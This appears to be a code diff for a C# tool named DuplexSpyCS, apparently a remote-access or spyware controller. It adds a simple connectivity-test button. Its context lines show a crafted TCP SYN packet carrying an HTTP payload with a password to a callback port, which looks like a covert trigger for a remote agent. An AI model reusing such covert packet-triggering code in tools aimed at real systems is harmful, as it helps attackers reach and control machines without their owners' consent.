@@ -14,6 +14,7 @@ using PacketDotNet;
 using PacketDotNet.Utils;
 using SharpPcap;
 using SharpPcap.LibPcap;
+using System.Net.Sockets;
 
 namespace DuplexSpyCS
 {
@@ -130,6 +131,7 @@ namespace DuplexSpyCS
                 $"Content-Length: {szPassword.Length}\r\n" +
                 $"\r\n" +
                 $"{szPassword}";
+
             TcpPacket pkt = new TcpPacket((ushort)nPortCallback, (ushort)nDestPort);
             pkt.Synchronize = true;
             pkt.PayloadData = Encoding.UTF8.GetBytes(szHttpPayload);
@@ -427,6 +429,26 @@ namespace DuplexSpyCS
         private void textBox2_TextChanged(object sender, EventArgs e)
         {
             textBox3.Text = textBox2.Text;
+        }
+
+        //Test
+        private void button2_Click(object sender, EventArgs e)
+        {
+            Task.Run(() =>
+            {
+                try
+                {
+                    Socket skt = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
+                    skt.Connect(new IPEndPoint(IPAddress.Parse(textBox1.Text), (int)numericUpDown2.Value));
+                    skt.Close();
+
+                    MessageBox.Show("Connect successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Failed to connect remote host.", "Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            });
         }
     }
 }
